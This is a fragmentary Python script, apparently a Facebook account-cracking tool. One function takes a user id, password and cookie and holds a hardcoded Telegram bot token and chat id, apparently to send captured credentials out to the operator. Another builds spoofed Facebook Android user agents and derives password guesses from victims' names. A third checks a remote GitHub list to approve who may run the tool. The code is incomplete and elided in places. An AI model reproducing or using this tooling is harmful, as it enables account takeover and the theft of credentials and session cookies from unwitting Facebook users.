...
def Elite(id,ps,coki):
    try:
        import requests
        token = "6861024956:AAEzMLtEuE_N-MGBP1eFO4xixBnrhgC1vog"#Add yout token 
        chatid = "5831501391"#Add your Chat Id
...
'Content-Length': str(len(content_lenght))}
    ...
    def methodB(self, sid, name, psw):
        try:
            ...
            sony = random.choice(['SonyEricssonST25iv','SonyEricssonST25i','Xperia U'])
            ####m2######
            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN\/FB4A;FBAV\/120.0.0.9.135;FBBV\/51058707;FBDM\/{density=1.5,width=720,height=1080};FBLC\/es_ES;FBCR\/Ufone;FBMF\/oppo;FBBD\/oppo;FBPN\/com.facebook.katana;FBDV\/SM-S727V;FBSV\/12.5.3;FBOP\/1;FBCA\/armeabi-v7a:armeabi;]"]'
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
...
def main_apv():
    ...
    print("\x1b[1;92m--------------------------------------------------")
    try:
       system = requests.get("https://github.com/Kkiijj/Fr/blob/main/Nix.txt").text 
        if Xyteee in system:
            print()
            msg = str(os.geteuid()) 
            time.sleep(1) 
